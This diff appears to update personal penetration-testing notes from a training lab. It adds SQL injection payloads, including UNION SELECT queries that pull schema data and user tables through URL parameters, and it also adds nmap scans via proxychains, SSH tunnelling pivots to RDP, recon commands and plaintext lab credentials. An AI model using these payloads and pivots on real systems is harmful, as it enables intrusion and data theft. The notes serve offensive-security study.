@@ -13,7 +13,7 @@ proxychains nmap -v -sT -Pn -T4 -sV 192.168.28.129,112,113,114
 
 
 SQL Injection
-tom' or 1='1
+admin' or 1='1
 SELECT carid, name, (SELECT SUM(cost) FROM Tires WHERE name = "goodyear") FROM car WHERE name = "ford";
 <URL>/uniondemo.php?Selection=2 OR 1=1
 <URL>/uniondemo.php?Selection=2 Union SELECT 1,2,3  <!-- Validate NUMBER of columns required -->
@@ -76,3 +76,29 @@ ssh comrade@0.0.0.0 -p 1700 -L 40000:192.168.28.27:22
 ssh zeus@0.0.0.0 -p 40000 -L 1900:192.168.28.9:3389
 ghjcnbnenrf
 xfreerdp /u:comrade /v:0.0.0.0:1900 /p:StudentMidwayPassword /size:1920x1000 +clipboard
+
+
+
+
+Pre-Test
+5 boxes
+ignore .190
+Lin-Ops -> 10.50.46.125
+2 Root/Admin 
+1)10.50.46.125 port 22,80
+nmap -v -sT -Pn -T4 -sV 192.168.28.129,112,113,114 
+user2 [1] => RntyrfVfNER78 [pass]
+ user3 [1] => Obo4GURRnccyrf [pass]
+Lee_Roth [1] => anotherpassword4THEages
+user2 = EaglesIsARE78
+cat /etc/hosts
+ip n
+arp -a
+--scripts http-enum
+2)192.168.28.181 WebApp 80
+3)
+4)
+UNION SELECT table_schema,column_name,table_name FROM information_schema.columns
+http://0.0.0.0:1200/pick.php?product=7 20UNION 20SELECT 20name,user_id,username 20FROM 20siteusers.users
+
+
